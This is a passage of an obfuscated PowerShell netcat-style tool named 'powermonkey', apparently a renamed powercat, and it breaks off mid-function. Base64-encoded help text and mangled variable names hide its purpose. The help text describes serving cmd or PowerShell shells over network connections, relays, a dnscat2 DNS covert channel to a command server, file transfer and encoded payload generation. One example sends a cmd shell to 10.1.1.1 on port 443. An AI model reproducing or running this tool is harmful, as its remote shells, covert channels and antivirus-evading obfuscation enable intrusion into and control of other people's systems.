function powermonkey
{
  param(
    [alias("Client")][string]$c="",
    [alias("Listen")][switch]$l=$False,
    [alias("Port")][Parameter(Position=-1)][string]$p="",
    [alias("Execute")][string]$e="",
    [alias("ExecutePowershell")][switch]$ep=$False,
    [alias("Relay")][string]$r="",
    [alias("UDP")][switch]$u=$False,
    [alias("dnscat2")][string]$dns="",
    [alias("DNSFailureThreshold")][int32]$dnsft=10,
    [alias("Timeout")][int32]$t=60,
    [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
    [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
    [alias("OutputFile")][string]$of="",
    [alias("Disconnect")][switch]$d=$False,
    [alias("Repeater")][switch]$rep=$False,
    [alias("GeneratePayload")][switch]$g=$False,
    [alias("GenerateEncoded")][switch]$ge=$False,
    [alias("Help")][switch]$h=$False
  )
  ${_/==\/\/=\____/==} = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('DQAKAHAAbwB3AGUAcgBjAGEAdAAgAC0AIABOAGUAdABjAGEAdAAsACAAVABoAGUAIABQAG8AdwBlAHIAcwBoAGUAbABsACAAVgBlAHIAcwBpAG8AbgANAAoARwBpAHQAaAB1AGIAIABSAGUAcABvAHMAaQB0AG8AcgB5ADoAIABoAHQAdABwAHMAOgAvAC8AZwBpAHQAaAB1AGIALgBjAG8AbQAvAGIAZQBzAGkAbQBvAHIAaABpAG4AbwAvAHAAbwB3AGUAcgBjAGEAdAANAAoADQAKAFQAaABpAHMAIABzAGMAcgBpAHAAdAAgAGEAdAB0AGUAbQBwAHQAcwAgAHQAbwAgAGkAbQBwAGwAZQBtAGUAbgB0ACAAdABoAGUAIABmAGUAYQB0AHUAcgBlAHMAIABvAGYAIABuAGUAdABjAGEAdAAgAGkAbgAgAGEAIABwAG8AdwBlAHIAcwBoAGUAbABsAA0ACgBzAGMAcgBpAHAAdAAuACAASQB0ACAAYQBsAHMAbwAgAGMAbwBuAHQAYQBpAG4AcwAgAGUAeAB0AHIAYQAgAGYAZQBhAHQAdQByAGUAcwAgAHMAdQBjAGgAIABhAHMAIABiAHUAaQBsAHQALQBpAG4AIAByAGUAbABhAHkAcwAsACAAZQB4AGUAYwB1AHQAZQANAAoAcABvAHcAZQByAHMAaABlAGwAbAAsACAAYQBuAGQAIABhACAAZABuAHMAYwBhAHQAMgAgAGMAbABpAGUAbgB0AC4ADQAKAA0ACgBVAHMAYQBnAGUAOgAgAHAAbwB3AGUAcgBjAGEAdAAgAFsALQBjACAAbwByACAALQBsAF0AIABbAC0AcAAgAHAAbwByAHQAXQAgAFsAbwBwAHQAaQBvAG4AcwBdAA0ACgANAAoAIAAgAC0AYwAgACAAPABpAHAAPgAgACAAIAAgACAAIAAgACAAQwBsAGkAZQBuAHQAIABNAG8AZABlAC4AIABQAHIAbwB2AGkAZABlACAAdABoAGUAIABJAFAAIABvAGYAIAB0AGgAZQAgAHMAeQBzAHQAZQBtACAAeQBvAHUAIAB3AGkAcwBoACAAdABvACAAYwBvAG4AbgBlAGMAdAAgAHQAbwAuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABJAGYAIAB5AG8AdQAgAGEAcgBlACAAdQBzAGkAbgBnACAALQBkAG4AcwAsACAAcwBwAGUAYwBpAGYAeQAgAHQAaABlACAARABOAFMAIABTAGUAcgB2AGUAcgAgAHQAbwAgAHMAZQBuAGQAIABxAHUAZQByAGkAZQBzACAAdABvAC4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAALQBsACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABMAGkAcwB0AGUAbgAgAE0AbwBkAGUALgAgAFMAdABhAHIAdAAgAGEAIABsAGkAcwB0AGUAbgBlAHIAIABvAG4AIAB0AGgAZQAgAHAAbwByAHQAIABzAHAAZQBjAGkAZgBpAGUAZAAgAGIAeQAgAC0AcAAuAA0ACgAgACAADQAKACAAIAAtAHAAIAAgADwAcABvAHIAdAA+ACAAIAAgACAAIAAgAFAAbwByAHQALgAgAFQAaABlACAAcABvAHIAdAAgAHQAbwAgAGMAbwBuAG4AZQBjAHQAIAB0AG8ALAAgAG8AcgAgAHQAaABlACAAcABvAHIAdAAgAHQAbwAgAGwAaQBzAHQAZQBuACAAbwBuAC4ADQAKACAAIAANAAoAIAAgAC0AZQAgACAAPABwAHIAbwBjAD4AIAAgACAAIAAgACAARQB4AGUAYwB1AHQAZQAuACAAUwBwAGUAYwBpAGYAeQAgAHQAaABlACAAbgBhAG0AZQAgAG8AZgAgAHQAaABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAHMAdABhAHIAdAAuAA0ACgAgACAADQAKACAAIAAtAGUAcAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEUAeABlAGMAdQB0AGUAIABQAG8AdwBlAHIAcwBoAGUAbABsAC4AIABTAHQAYQByAHQAIABhACAAcABzAGUAdQBkAG8AIABwAG8AdwBlAHIAcwBoAGUAbABsACAAcwBlAHMAcwBpAG8AbgAuACAAWQBvAHUAIABjAGEAbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZABlAGMAbABhAHIAZQAgAHYAYQByAGkAYQBiAGwAZQBzACAAYQBuAGQAIABlAHgAZQBjAHUAdABlACAAYwBvAG0AbQBhAG4AZABzACwAIABiAHUAdAAgAGkAZgAgAHkAbwB1ACAAdAByAHkAIAB0AG8AIABlAG4AdABlAHIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAbgBvAHQAaABlAHIAIABzAGgAZQBsAGwAIAAoAG4AcwBsAG8AbwBrAHUAcAAsACAAbgBlAHQAcwBoACwAIABjAG0AZAAsACAAZQB0AGMALgApACAAdABoAGUAIABzAGgAZQBsAGwAIAB3AGkAbABsACAAaABhAG4AZwAuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgAC0AcgAgACAAPABzAHQAcgA+ACAAIAAgACAAIAAgACAAUgBlAGwAYQB5AC4AIABVAHMAZQBkACAAZgBvAHIAIAByAGUAbABhAHkAaQBuAGcAIABuAGUAdAB3AG8AcgBrACAAdAByAGEAZgBmAGkAYwAgAGIAZQB0AHcAZQBlAG4AIAB0AHcAbwAgAG4AbwBkAGUAcwAuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABDAGwAaQBlAG4AdAAgAFIAZQBsAGEAeQAgAEYAbwByAG0AYQB0ADoAIAAgACAALQByACAAPABwAHIAbwB0AG8AYwBvAGwAPgA6ADwAaQBwACAAYQBkAGQAcgA+ADoAPABwAG8AcgB0AD4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEwAaQBzAHQAZQBuAGUAcgAgAFIAZQBsAGEAeQAgAEYAbwByAG0AYQB0ADoAIAAtAHIAIAA8AHAAcgBvAHQAbwBjAG8AbAA+ADoAPABwAG8AcgB0AD4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQATgBTAEMAYQB0ADIAIABSAGUAbABhAHkAIABGAG8AcgBtAGEAdAA6ACAAIAAtAHIAIABkAG4AcwA6ADwAZABuAHMAIABzAGUAcgB2AGUAcgA+ADoAPABkAG4AcwAgAHAAbwByAHQAPgA6ADwAZABvAG0AYQBpAG4APgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAtAHUAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFUARABQACAATQBvAGQAZQAuACAAUwBlAG4AZAAgAHQAcgBhAGYAZgBpAGMAIABvAHYAZQByACAAVQBEAFAALgAgAEIAZQBjAGEAdQBzAGUAIABpAHQAJwBzACAAVQBEAFAALAAgAHQAaABlACAAYwBsAGkAZQBuAHQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAG0AdQBzAHQAIABzAGUAbgBkACAAZABhAHQAYQAgAGIAZQBmAG8AcgBlACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGMAYQBuACAAcgBlAHMAcABvAG4AZAAuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgAC0AZABuAHMAIAAgADwAZABvAG0AYQBpAG4APgAgACAARABOAFMAIABNAG8AZABlAC4AIABTAGUAbgBkACAAdAByAGEAZgBmAGkAYwAgAG8AdgBlAHIAIAB0AGgAZQAgAGQAbgBzAGMAYQB0ADIAIABkAG4AcwAgAGMAbwB2AGUAcgB0ACAAYwBoAGEAbgBuAGUAbAAuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHAAZQBjAGkAZgB5ACAAdABoAGUAIABkAG4AcwAgAHMAZQByAHYAZQByACAAdABvACAALQBjACwAIAB0AGgAZQAgAGQAbgBzACAAcABvAHIAdAAgAHQAbwAgAC0AcAAsACAAYQBuAGQAIABzAHAAZQBjAGkAZgB5ACAAdABoAGUAIAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZABvAG0AYQBpAG4AIAB0AG8AIAB0AGgAaQBzACAAbwBwAHQAaQBvAG4ALAAgAC0AZABuAHMALgAgAFQAaABpAHMAIABpAHMAIABvAG4AbAB5ACAAYQAgAGMAbABpAGUAbgB0AC4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEcAZQB0ACAAdABoAGUAIABzAGUAcgB2AGUAcgAgAGgAZQByAGUAOgAgAGgAdAB0AHAAcwA6AC8ALwBnAGkAdABoAHUAYgAuAGMAbwBtAC8AaQBhAGcAbwB4ADgANgAvAGQAbgBzAGMAYQB0ADIADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAALQBkAG4AcwBmAHQAIAA8AGkAbgB0AD4AIAAgACAAIABEAE4AUwAgAEYAYQBpAGwAdQByAGUAIABUAGgAcgBlAHMAaABvAGwAZAAuACAAVABoAGkAcwAgAGkAcwAgAGgAbwB3ACAAbQBhAG4AeQAgAGIAYQBkACAAcABhAGMAawBlAHQAcwAgAHQAaABlACAAYwBsAGkAZQBuAHQAIABjAGEAbgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAGMAaQBlAHYAZQAgAGIAZQBmAG8AcgBlACAAZQB4AGkAdABpAG4AZwAuACAAUwBlAHQAIAB0AG8AIAB6AGUAcgBvACAAdwBoAGUAbgAgAHIAZQBjAGUAaQB2AGkAbgBnACAAZgBpAGwAZQBzACwAIABhAG4AZAAgAHMAZQB0ACAAaABpAGcAaAANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAZgBvAHIAIABtAG8AcgBlACAAcwB0AGEAYgBpAGwAaQB0AHkAIABvAHYAZQByACAAdABoAGUAIABpAG4AdABlAHIAbgBlAHQALgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAtAHQAIAAgADwAaQBuAHQAPgAgACAAIAAgACAAIAAgAFQAaQBtAGUAbwB1AHQALgAgAFQAaABlACAAbgB1AG0AYgBlAHIAIABvAGYAIABzAGUAYwBvAG4AZABzACAAdABvACAAdwBhAGkAdAAgAGIAZQBmAG8AcgBlACAAZwBpAHYAaQBuAGcAIAB1AHAAIABvAG4AIABsAGkAcwB0AGUAbgBpAG4AZwAgAG8AcgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBvAG4AbgBlAGMAdABpAG4AZwAuACAARABlAGYAYQB1AGwAdAA6ACAANgAwAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgAC0AaQAgACAAPABpAG4AcAB1AHQAPgAgACAAIAAgACAASQBuAHAAdQB0AC4AIABQAHIAbwB2AGkAZABlACAAZABhAHQAYQAgAHQAbwAgAGIAZQAgAHMAZQBuAHQAIABkAG8AdwBuACAAdABoAGUAIABwAGkAcABlACAAYQBzACAAcwBvAG8AbgAgAGEAcwAgAGEAIABjAG8AbgBuAGUAYwB0AGkAbwBuACAAaQBzAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABlAHMAdABhAGIAbABpAHMAaABlAGQALgAgAFUAcwBlAGQAIABmAG8AcgAgAG0AbwB2AGkAbgBnACAAZgBpAGwAZQBzAC4AIABZAG8AdQAgAGMAYQBuACAAcAByAG8AdgBpAGQAZQAgAHQAaABlACAAcABhAHQAaAAgAHQAbwAgAGEAIABmAGkAbABlACwADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGEAIABiAHkAdABlACAAYQByAHIAYQB5ACAAbwBiAGoAZQBjAHQALAAgAG8AcgAgAGEAIABzAHQAcgBpAG4AZwAuACAAWQBvAHUAIABjAGEAbgAgAGEAbABzAG8AIABwAGkAcABlACAAYQBuAHkAIABvAGYAIAB0AGgAbwBzAGUAIABpAG4AdABvAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAG8AdwBlAHIAYwBhAHQALAAgAGwAaQBrAGUAIAAnAGEAYQBhAGEAYQBhACcAIAB8ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQAwAC4AMQAuADEALgAxACAALQBwACAAOAAwAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgAC0AbwAgACAAPAB0AHkAcABlAD4AIAAgACAAIAAgACAATwB1AHQAcAB1AHQALgAgAFMAcABlAGMAaQBmAHkAIABoAG8AdwAgAHAAbwB3AGUAcgBjAGEAdAAgAHMAaABvAHUAbABkACAAcgBlAHQAdQByAG4AIABpAG4AZgBvAHIAbQBhAHQAaQBvAG4AIAB0AG8AIAB0AGgAZQAgAGMAbwBuAHMAbwBsAGUALgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVgBhAGwAaQBkACAAbwBwAHQAaQBvAG4AcwAgAGEAcgBlACAAJwBCAHkAdABlAHMAJwAsACAAJwBTAHQAcgBpAG4AZwAnACwAIABvAHIAIAAnAEgAbwBzAHQAJwAuACAARABlAGYAYQB1AGwAdAAgAGkAcwAgACcASABvAHMAdAAnAC4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAALQBvAGYAIAA8AHAAYQB0AGgAPgAgACAAIAAgACAAIABPAHUAdABwAHUAdAAgAEYAaQBsAGUALgAgACAAUwBwAGUAYwBpAGYAeQAgAHQAaABlACAAcABhAHQAaAAgAHQAbwAgAGEAIABmAGkAbABlACAAdABvACAAdwByAGkAdABlACAAbwB1AHQAcAB1AHQAIAB0AG8ALgANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAtAGQAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAEQAaQBzAGMAbwBuAG4AZQBjAHQALgAgAHAAbwB3AGUAcgBjAGEAdAAgAHcAaQBsAGwAIABkAGkAcwBjAG8AbgBuAGUAYwB0ACAAYQBmAHQAZQByACAAdABoAGUAIABjAG8AbgBuAGUAYwB0AGkAbwBuACAAaQBzACAAZQBzAHQAYQBiAGwAaQBzAGgAZQBkAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABhAG4AZAAgAHQAaABlACAAaQBuAHAAdQB0ACAAZgByAG8AbQAgAC0AaQAgAGkAcwAgAHMAZQBuAHQALgAgAFUAcwBlAGQAIABmAG8AcgAgAHMAYwBhAG4AbgBpAG4AZwAuAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAANAAoAIAAgAC0AcgBlAHAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUgBlAHAAZQBhAHQAZQByAC4AIABwAG8AdwBlAHIAYwBhAHQAIAB3AGkAbABsACAAYwBvAG4AdABpAG4AdQBhAGwAbAB5ACAAcgBlAHMAdABhAHIAdAAgAGEAZgB0AGUAcgAgAGkAdAAgAGkAcwAgAGQAaQBzAGMAbwBuAG4AZQBjAHQAZQBkAC4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFUAcwBlAGQAIABmAG8AcgAgAHMAZQB0AHQAaQBuAGcAIAB1AHAAIABhACAAcABlAHIAcwBpAHMAdABlAG4AdAAgAHMAZQByAHYAZQByAC4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAALQBnACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABHAGUAbgBlAHIAYQB0AGUAIABQAGEAeQBsAG8AYQBkAC4AIAAgAFIAZQB0AHUAcgBuAHMAIABhACAAcwBjAHIAaQBwAHQAIABhAHMAIABhACAAcwB0AHIAaQBuAGcAIAB3AGgAaQBjAGgAIAB3AGkAbABsACAAZQB4AGUAYwB1AHQAZQAgAHQAaABlAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABwAG8AdwBlAHIAYwBhAHQAIAB3AGkAdABoACAAdABoAGUAIABvAHAAdABpAG8AbgBzACAAeQBvAHUAIABoAGEAdgBlACAAcwBwAGUAYwBpAGYAaQBlAGQALgAgAC0AaQAsACAALQBkACwAIABhAG4AZAAgAC0AcgBlAHAAIAB3AGkAbABsACAAbgBvAHQADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAZQAgAGkAbgBjAG8AcgBwAG8AcgBhAHQAZQBkAC4ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAALQBnAGUAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABHAGUAbgBlAHIAYQB0AGUAIABFAG4AYwBvAGQAZQBkACAAUABhAHkAbABvAGEAZAAuACAARABvAGUAcwAgAHQAaABlACAAcwBhAG0AZQAgAGEAcwAgAC0AZwAsACAAYgB1AHQAIAByAGUAdAB1AHIAbgBzACAAYQAgAHMAdAByAGkAbgBnACAAdwBoAGkAYwBoAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABjAGEAbgAgAGIAZQAgAGUAeABlAGMAdQB0AGUAZAAgAGkAbgAgAHQAaABpAHMAIAB3AGEAeQA6ACAAcABvAHcAZQByAHMAaABlAGwAbAAgAC0ARQAgADwAZQBuAGMAbwBkAGUAZAAgAHMAdAByAGkAbgBnAD4ADQAKAA0ACgAgACAALQBoACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABQAHIAaQBuAHQAIAB0AGgAaQBzACAAaABlAGwAcAAgAG0AZQBzAHMAYQBnAGUALgANAAoADQAKAEUAeABhAG0AcABsAGUAcwA6AA0ACgANAAoAIAAgAEwAaQBzAHQAZQBuACAAbwBuACAAcABvAHIAdAAgADgAMAAwADAAIABhAG4AZAAgAHAAcgBpAG4AdAAgAHQAaABlACAAbwB1AHQAcAB1AHQAIAB0AG8AIAB0AGgAZQAgAGMAbwBuAHMAbwBsAGUALgANAAoAIAAgACAAIAAgACAAcABvAHcAZQByAGMAYQB0ACAALQBsACAALQBwACAAOAAwADAAMAANAAoAIAAgAA0ACgAgACAAQwBvAG4AbgBlAGMAdAAgAHQAbwAgADEAMAAuADEALgAxAC4AMQAgAHAAbwByAHQAIAA0ADQAMwAsACAAcwBlAG4AZAAgAGEAIABzAGgAZQBsAGwALAAgAGEAbgBkACAAZQBuAGEAYgBsAGUAIAB2AGUAcgBiAG8AcwBpAHQAeQAuAA0ACgAgACAAIAAgACAAIABwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADAALgAxAC4AMQAuADEAIAAtAHAAIAA0ADQAMwAgAC0AZQAgAGMAbQBkACAALQB2AA0ACgAgACAADQAKACAAIABDAG8AbgBuAGUAYwB0ACAAdABvACAAdABoAGUAIABkAG4AcwBjAGEAdAAyACAAcwBlAHIAdgBlAHIAIABvAG4AIABjADIALgBlAHgAYQBtAHAAbABlAC4AYwBvAG0ALAAgAGEAbgBkACAAcwBlAG4AZAAgAGQAbgBzACAAcQB1AGUAcgBpAGUAcwANAAoAIAAgAHQAbwAgAHQAaABlACAAZABuAHMAIABzAGUAcgB2AGUAcgAgAG8AbgAgADEAMAAuADEALgAxAC4AMQAgAHAAbwByAHQAIAA1ADMALgANAAoAIAAgACAAIAAgACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMQAwAC4AMQAuADEALgAxACAALQBwACAANQAzACAALQBkAG4AcwAgAGMAMgAuAGUAeABhAG0AcABsAGUALgBjAG8AbQANAAoAIAAgAA0ACgAgACAAUwBlAG4AZAAgAGEAIABmAGkAbABlACAAdABvACAAMQAwAC4AMQAuADEALgAxADUAIABwAG8AcgB0ACAAOAAwADAAMAAuAA0ACgAgACAAIAAgACAAIABwAG8AdwBlAHIAYwBhAHQAIAAtAGMAIAAxADAALgAxAC4AMQAuADEANQAgAC0AcAAgADgAMAAwADAAIAAtAGkAIABDADoAXABpAG4AcAB1AHQAZgBpAGwAZQANAAoAIAAgAA0ACgAgACAAVwByAGkAdABlACAAdABoAGUAIABkAGEAdABhACAAcwBlAG4AdAAgAHQAbwAgAHQAaABlACAAbABvAGMAYQBsACAAbABpAHMAdABlAG4AZQByACAAbwBuACAAcABvAHIAdAAgADQANAA0ADQAIAB0AG8AIABDADoAXABvAHUAdABmAGkAbABlAA0ACgAgACAAIAAgACAAIABwAG8AdwBlAHIAYwBhAHQAIAAtAGwAIAAtAHAAIAA0ADQANAA0ACAALQBvAGYAIABDADoAXABvAHUAdABmAGkAbABlAA0ACgAgACAADQAKACAAIABMAGkAcwB0AGUAbgAgAG8AbgAgAHAAbwByAHQAIAA4ADAAMAAwACAAYQBuAGQAIAByAGUAcABlAGEAdABlAGQAbAB5ACAAcwBlAHIAdgBlAHIAIABhACAAcABvAHcAZQByAHMAaABlAGwAbAAgAHMAaABlAGwAbAAuAA0ACgAgACAAIAAgACAAIABwAG8AdwBlAHIAYwBhAHQAIAAtAGwAIAAtAHAAIAA4ADAAMAAwACAALQBlAHAAIAAtAHIAZQBwAA0ACgAgACAADQAKACAAIABSAGUAbABhAHkAIAB0AHIAYQBmAGYAaQBjACAAYwBvAG0AaQBuAGcAIABpAG4AIABvAG4AIABwAG8AcgB0ACAAOAAwADAAMAAgAG8AdgBlAHIAIAB0AGMAcAAgAHQAbwAgAHAAbwByAHQAIAA5ADAAMAAwACAAbwBuACAAMQAwAC4AMQAuADEALgAxACAAbwB2AGUAcgAgAHQAYwBwAC4ADQAKACAAIAAgACAAIAAgAHAAbwB3AGUAcgBjAGEAdAAgAC0AbAAgAC0AcAAgADgAMAAwADAAIAAtAHIAIAB0AGMAcAA6ADEAMAAuADEALgAxAC4AMQA6ADkAMAAwADAADQAKACAAIAAgACAAIAAgAA0ACgAgACAAUgBlAGwAYQB5ACAAdAByAGEAZgBmAGkAYwAgAGMAbwBtAGkAbgBnACAAaQBuACAAbwBuACAAcABvAHIAdAAgADgAMAAwADAAIABvAHYAZQByACAAdABjAHAAIAB0AG8AIAB0AGgAZQAgAGQAbgBzAGMAYQB0ADIAIABzAGUAcgB2AGUAcgAgAG8AbgAgAGMAMgAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAsAA0ACgAgACAAcwBlAG4AZABpAG4AZwAgAHEAdQBlAHIAaQBlAHMAIAB0AG8AIAAxADAALgAxAC4AMQAuADEAIABwAG8AcgB0ACAANQAzAC4ADQAKACAAIAAgACAAIAAgAHAAbwB3AGUAcgBjAGEAdAAgAC0AbAAgAC0AcAAgADgAMAAwADAAIAAtAHIAIABkAG4AcwA6ADEAMAAuADEALgAxAC4AMQA6ADUAMwA6AGMAMgAuAGUAeABhAG0AcABsAGUALgBjAG8AbQANAAoA')))
  if($h){return ${_/==\/\/=\____/==}}
  ${global:_/======\/\/\/==\} = ${_/======\/\/\/==\}
  if($of -ne ''){$o = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QgB5AHQAZQBzAA==')))}
  if($dns -eq "")
  {
    if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABtAHUAcwB0ACAAcwBlAGwAZQBjAHQAIABlAGkAdABoAGUAcgAgAGMAbABpAGUAbgB0ACAAbQBvAGQAZQAgACgALQBjACkAIABvAHIAIABsAGkAcwB0AGUAbgAgAG0AbwBkAGUAIAAoAC0AbAApAC4A')))}
    if($p -eq ""){return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABsAGUAYQBzAGUAIABwAHIAbwB2AGkAZABlACAAYQAgAHAAbwByAHQAIABuAHUAbQBiAGUAcgAgAHQAbwAgAC0AcAAuAA==')))}
  }
  if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WQBvAHUAIABjAGEAbgAgAG8AbgBsAHkAIABwAGkAYwBrACAAbwBuAGUAIABvAGYAIAB0AGgAZQBzAGUAOgAgAC0AZQAsACAALQBlAHAALAAgAC0AcgA=')))}
  if(($i -ne $null) -and (($r -ne "") -or ($e -ne ""))){return $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('LQBpACAAaQBzACAAbgBvAHQAIABhAHAAcABsAGkAYwBhAGIAbABlACAAaABlAHIAZQAuAA==')))}
  if($l)
  {
    ${_/==\/========\__} = $False
    netstat -na | sls LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAGUAbABlAGMAdABlAGQAIABwAG8AcgB0ACAA'))) + $p + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUALgA=')))) ; ${_/==\/========\__}=$True}}
    if(${_/==\/========\__}){break}
  }
  if($r -ne "")
  {
    if($r.split(":").Count -eq 2)
    {
      ${_/==\/========\__} = $False
      netstat -na | sls LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $r.split(":")[1]){echo ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABoAGUAIABzAGUAbABlAGMAdABlAGQAIABwAG8AcgB0ACAA'))) + $r.split(":")[1] + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUALgA=')))) ; ${_/==\/========\__}=$True}}
      if(${_/==\/========\__}){break}
    }
  }
  function Setup_UDP
  {
    param($FuncSetupVars)
    if(${global:_/======\/\/\/==\}){${_/======\/\/\/==\} = $True}
    $c,$l,$p,$t = $FuncSetupVars
    $FuncVars = @{}
    $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBuAGMAbwBkAGkAbgBnAA==')))] = New-Object System.Text.AsciiEncoding
    if($l)
    {
      ${_/\/\/==\/\_/==\_} = New-Object System.Byte[] 65536
      ${/\______/\/=\__/\} = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
      $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))] = New-Object System.Net.Sockets.UDPClient $p
      ${_/=\_/==\_/\/==\/} = New-Object System.Net.Sockets.IPPacketInformation
      Write-Verbose ($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABpAHMAdABlAG4AaQBuAGcAIABvAG4AIABbADAALgAwAC4AMAAuADAAXQAgAHAAbwByAHQAIAA='))) + $p + $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('IABbAHUAZABwAF0A'))))
      ${__/\/\_/=\_/\/=\_} = $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Client.BeginReceiveMessageFrom(${_/\/\/==\/\_/==\_},0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]${/\______/\/=\__/\},$null,$null)
      ${_/\/=\/\__/\_____} = [System.Diagnostics.Stopwatch]::StartNew()
      while($True)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          if(@(17,27) -contains ($Host.UI.RawUI.ReadKey($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAEUAYwBoAG8ALABJAG4AYwBsAHUAZABlAEsAZQB5AEQAbwB3AG4ALABJAG4AYwBsAHUAZABlAEsAZQB5AFUAcAA=')))).VirtualKeyCode))
          {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBUAFIATAAgAG8AcgAgAEUAUwBDACAAYwBhAHUAZwBoAHQALgAgAFMAdABvAHAAcABpAG4AZwAgAFUARABQACAAUwBlAHQAdQBwAC4ALgAuAA==')))
            $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Close()
            ${_/\/=\/\__/\_____}.Stop()
            break
          }
        }
        if(${_/\/=\/\__/\_____}.Elapsed.TotalSeconds -gt $t)
        {
          $FuncVars[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAGMAawBlAHQA')))].Close()
          ${_/\/=\/\__/\_____}.Stop()
          Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABpAG0AZQBvAHUAdAAhAA=='))) ; break
        }
        if(${__/\/\_/=\_/\/=\_}.IsCompleted)
        {
